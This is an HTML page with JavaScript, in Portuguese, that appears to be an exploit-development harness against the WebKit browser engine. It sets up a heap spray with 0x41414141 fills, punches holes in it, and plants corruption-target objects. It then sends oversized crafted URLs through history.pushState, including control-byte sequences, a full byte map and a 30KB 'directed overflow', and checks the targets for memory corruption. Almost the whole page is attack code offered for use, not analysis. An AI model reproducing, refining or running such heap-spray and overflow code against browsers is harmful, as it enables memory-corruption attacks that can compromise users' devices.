
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WebKit 6-3-1 Final</title>
</head>
<body>

<h1>WebKit 6-3-1 - Versão Final</h1>

<h2>CORREÇÕES FINAIS</h2>
<p><strong>1.</strong> Alvos criados NO INÍCIO (antes de tudo)</p>
<p><strong>2.</strong> Teste 3 com apenas 50 repetições (menos quota)</p>
<p><strong>3.</strong> Overflow direcionado após mapeamento</p>

<hr>

<h2>Executar Sequência Final</h2>
<button onclick="executeFinal()">▶ EXECUTAR 6-3-1 FINAL</button>

<hr>

<h2>Monitoramento</h2>
<div id="quota" style="background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px;">
    <strong>Quota:</strong> <span id="quotaCount">0</span> | 
    <strong>Status:</strong> <span id="quotaStatus">OK</span>
</div>

<hr>

<button onclick="clearLog()">Limpar</button>

<hr>

<div id="log"></div>

<script>
const BASE_SAFE = 709522;

let heapObjects = [];
let targetObjects = [];
let functionTargets = [];
let stringTargets = [];
let arrayTargets = [];

let quotaUsed = 0;

function log(msg) {
    const el = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    el.innerHTML += `<div>[${time}] ${msg}</div>`;
    el.scrollTop = el.scrollHeight;
}

function clearLog() {
    document.getElementById('log').innerHTML = '';
    quotaUsed = 0;
    updateQuota();
    log('Sistema limpo');
}

function updateQuota() {
    document.getElementById('quotaCount').textContent = quotaUsed;
    const status = document.getElementById('quotaStatus');
    
    if (quotaUsed < 8) {
        status.textContent = 'OK';
        status.style.color = 'green';
    } else if (quotaUsed < 15) {
        status.textContent = 'ATENÇÃO';
        status.style.color = 'orange';
    } else {
        status.textContent = 'CRÍTICO';
        status.style.color = 'red';
    }
}

// ===================================================================
// PREPARAÇÃO COMPLETA NO INÍCIO
// ===================================================================
function prepareEverything() {
    log('═══ PREPARAÇÃO INICIAL COMPLETA ═══');
    log('Criando TODOS os objetos ANTES dos testes...');
    
    heapObjects = [];
    targetObjects = [];
    functionTargets = [];
    stringTargets = [];
    arrayTargets = [];
    
    // Heap spray
    for (let i = 0; i < 500; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0x41414141);
        heapObjects.push({buf, view});
    }
    
    // Holes
    for (let i = 0; i < heapObjects.length; i += 3) {
        heapObjects[i] = null;
    }
    
    // Buffer targets
    for (let i = 0; i < 50; i++) {
        const buf = new ArrayBuffer(1024);
        const view = new Uint32Array(buf);
        view.fill(0xDEADBEEF);
        targetObjects.push({
            id: i,
            magic: 0xCAFEBABE,
            buf: buf,
            view: view
        });
    }
    
    // Function targets
    for (let i = 0; i < 50; i++) {
        const expectedReturn = 0x90000000 + i;
        const func = new Function('', `return 0x${expectedReturn.toString(16)};`);
        functionTargets.push({
            id: i,
            func: func,
            expected: expectedReturn
        });
    }
    
    // String targets
    for (let i = 0; i < 50; i++) {
        const str = "TARGET_" + i + "_" + "X".repeat(100);
        stringTargets.push({
            id: i,
            original: str,
            current: str
        });
    }
    
    // Array targets
    for (let i = 0; i < 50; i++) {
        const arr = new Array(100);
        for (let j = 0; j < 100; j++) {
            arr[j] = 0x50000000 + i * 1000 + j;
        }
        arrayTargets.push({
            id: i,
            array: arr,
            originalLength: arr.length
        });
    }
    
    log(`✓ Heap: 500 objetos`);
    log(`✓ Buffers: ${targetObjects.length}`);
    log(`✓ Funções: ${functionTargets.length}`);
    log(`✓ Strings: ${stringTargets.length}`);
    log(`✓ Arrays: ${arrayTargets.length}`);
    log('Todos os alvos prontos ANTES dos testes!');
}

// ===================================================================
// VERIFICAÇÃO
// ===================================================================
function checkAll() {
    let total = 0;
    let details = [];
    
    // Buffers
    for (let i = 0; i < Math.min(10, targetObjects.length); i++) {
        try {
            const t = targetObjects[i];
            if (t.magic !== 0xCAFEBABE) {
                details.push(`Buffer ${i}: magic=0x${t.magic.toString(16)}`);
                total++;
            }
            if (t.view[0] !== 0xDEADBEEF) {
                details.push(`Buffer ${i}: view=0x${t.view[0].toString(16)}`);
                total++;
            }
        } catch (e) {
            details.push(`Buffer ${i}: DESTROYED`);
            total++;
        }
    }
    
    // Functions
    for (let i = 0; i < Math.min(20, functionTargets.length); i++) {
        const t = functionTargets[i];
        try {
            const result = t.func();
            if (isNaN(result)) {
                details.push(`Function ${i}: NaN`);
                total++;
            } else if (result !== t.expected) {
                details.push(`Function ${i}: 0x${result.toString(16)}`);
                total++;
            }
        } catch (e) {
            details.push(`Function ${i}: CRASH`);
            total++;
        }
    }
    
    // Strings
    for (let i = 0; i < Math.min(20, stringTargets.length); i++) {
        const t = stringTargets[i];
        if (t.current.length !== t.original.length || t.current !== t.original) {
            details.push(`String ${i}: alterada`);
            total++;
        }
    }
    
    // Arrays
    for (let i = 0; i < Math.min(20, arrayTargets.length); i++) {
        const t = arrayTargets[i];
        try {
            const expected = 0x50000000 + i * 1000;
            if (t.array.length !== t.originalLength || t.array[0] !== expected) {
                details.push(`Array ${i}: alterado`);
                total++;
            }
        } catch (e) {
            details.push(`Array ${i}: ERROR`);
            total++;
        }
    }
    
    return { total, details };
}

// ===================================================================
// TESTE 6: INCREMENTAL
// ===================================================================
async function test6() {
    log('');
    log('═══ TESTE 6: INCREMENTAL ═══');
    
    let currentSize = 1000;
    const step = 5000;
    
    for (let i = 0; i < 10; i++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            for (let j = 0; j < currentSize; j++) {
                overflow += String.fromCharCode(j % 33);
            }
            
            history.pushState({}, `inc_${currentSize}`, "/" + base + overflow);
            quotaUsed++;
            updateQuota();
            
            log(`Tentativa ${i+1}: ${currentSize} bytes OK (quota: ${quotaUsed})`);
            currentSize += step;
            
            await new Promise(r => setTimeout(r, 1500));
            
        } catch (e) {
            log(`CRASH em ${currentSize}: ${e.message}`);
            break;
        }
    }
}

// ===================================================================
// TESTE 3: ULTRA REDUZIDO (50 reps!)
// ===================================================================
function test3() {
    log('');
    log('═══ TESTE 3: SEQUÊNCIAS (50 REPS) ═══');
    
    const sequences = [
        { name: "Null", bytes: [0x00, 0x00, 0x00, 0x00] },
        { name: "Newlines", bytes: [0x0A, 0x0A, 0x0A, 0x0A] },
        { name: "Tabs", bytes: [0x09, 0x09, 0x09, 0x09] },
        { name: "CR", bytes: [0x0D, 0x0D, 0x0D, 0x0D] },
        { name: "Space", bytes: [0x20, 0x20, 0x20, 0x20] },
        { name: "Mixed", bytes: [0x00, 0x09, 0x0A, 0x0D, 0x20] },
        { name: "Control", bytes: [0x01, 0x02, 0x03, 0x04, 0x05] },
        { name: "Bell", bytes: [0x07, 0x08, 0x08, 0x07] }
    ];
    
    for (let seq of sequences) {
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            
            // APENAS 50 REPETIÇÕES!
            for (let i = 0; i < 50; i++) {
                for (let byte of seq.bytes) {
                    overflow += String.fromCharCode(byte);
                }
            }
            
            history.pushState({}, seq.name, "/" + base + overflow);
            quotaUsed++;
            updateQuota();
            
            log(`${seq.name}: OK (quota: ${quotaUsed})`);
            
        } catch (e) {
            log(`${seq.name}: ${e.message}`);
        }
    }
    
    log('Teste 3 concluído');
}

// ===================================================================
// TESTE 1: MAPEAMENTO + OVERFLOW DIRECIONADO
// ===================================================================
function test1() {
    log('');
    log('═══ TESTE 1: MAPEAMENTO + OVERFLOW ═══');
    log(`Quota antes do T1: ${quotaUsed}`);
    
    const allowedBytes = [];
    const crashBytes = [];
    
    // Mapear bytes
    for (let byte = 0x00; byte <= 0xFF; byte++) {
        try {
            const base = "A".repeat(BASE_SAFE);
            const testByte = String.fromCharCode(byte);
            const overflow = testByte.repeat(100);
            
            history.pushState({}, `test_${byte}`, "/" + base + overflow);
            quotaUsed++;
            
            allowedBytes.push(byte);
            
            if (byte % 32 === 0) {
                log(`0x${byte.toString(16).padStart(2, '0')}... OK`);
            }
            
        } catch (e) {
            crashBytes.push(byte);
        }
    }
    
    updateQuota();
    
    log('');
    log('=== MAPEAMENTO ===');
    log(`Permitidos: ${allowedBytes.length}`);
    if (allowedBytes.length > 0) {
        log(`Range: 0x${Math.min(...allowedBytes).toString(16)} - 0x${Math.max(...allowedBytes).toString(16)}`);
    }
    log(`Crasham: ${crashBytes.length}`);
    
    // Verificação 1
    log('');
    log('=== VERIFICAÇÃO PÓS-MAPEAMENTO ===');
    let result = checkAll();
    log(`Total: ${result.total}`);
    
    if (result.total > 0) {
        log('');
        log('!!! CORRUPÇÃO DETECTADA !!!');
        for (let d of result.details.slice(0, 10)) {
            log(`  ${d}`);
        }
    }
    
    // OVERFLOW DIRECIONADO (NOVO!)
    if (allowedBytes.length > 0 && result.total === 0) {
        log('');
        log('=== OVERFLOW DIRECIONADO ===');
        log('Sem corrupção no mapeamento, tentando overflow maior...');
        
        try {
            const base = "A".repeat(BASE_SAFE);
            let overflow = "";
            
            // Usar TODOS os bytes permitidos
            for (let i = 0; i < 30000; i++) {
                overflow += String.fromCharCode(allowedBytes[i % allowedBytes.length]);
            }
            
            history.pushState({}, "directed", "/" + base + overflow);
            quotaUsed++;
            updateQuota();
            
            log(`Overflow de 30000 bytes executado (quota: ${quotaUsed})`);
            
            // Verificação 2
            log('');
            log('=== VERIFICAÇÃO PÓS-OVERFLOW ===');
            result = checkAll();
            log(`Total: ${result.total}`);
            
            if (result.total > 0) {
                log('');
                log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
                log(`CORRUPÇÃO! ${result.total} alvos`);
                log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
                for (let d of result.details) {
                    log(`  ${d}`);
                }
            } else {
                log('Ainda sem corrupção detectada');
            }
            
        } catch (e) {
            log(`Overflow direcionado falhou: ${e.message}`);
        }
    }
    
    // Anomalia
    if (allowedBytes.length !== 33 && allowedBytes.length > 0) {
        log('');
        log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
        log('COMPORTAMENTO ANÔMALO!');
        log(`Esperado: 33, Obtido: ${allowedBytes.length}`);
        log('!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!');
    }
}

// ===================================================================
// SEQUÊNCIA FINAL
// ===================================================================
async function executeFinal() {
    log('═══════════════════════════════════════');
    log('SEQUÊNCIA 6-3-1 FINAL');
    log('═══════════════════════════════════════');
    
    clearLog();
    
    log('MUDANÇAS CRÍTICAS:');
    log('1. Alvos criados NO INÍCIO');
    log('2. Teste 3 com 50 reps (vs 200/1000)');
    log('3. Overflow direcionado de 30KB após mapeamento');
    log('');
    
    // CRIAR TUDO PRIMEIRO!
    prepareEverything();
    
    await new Promise(r => setTimeout(r, 1000));
    
    // Teste 6
    await test6();
    
    await new Promise(r => setTimeout(r, 2000));
    
    // Teste 3 (reduzido!)
    test3();
    
    await new Promise(r => setTimeout(r, 2000));
    
    // Teste 1 + overflow
    test1();
    
    await new Promise(r => setTimeout(r, 1000));
    
    log('');
    log('═══════════════════════════════════════');
    log(`SEQUÊNCIA CONCLUÍDA - Quota: ${quotaUsed}`);
    log('═══════════════════════════════════════');
}

log('WebKit 6-3-1 - Versão Final');
log('');
log('OTIMIZAÇÕES FINAIS:');
log('- Alvos criados ANTES de qualquer teste');
log('- Teste 3: apenas 50 repetições');
log('- Overflow direcionado de 30KB após mapeamento');
log('');
log('Execute "6-3-1 FINAL"');
</script>

</body>
</html>
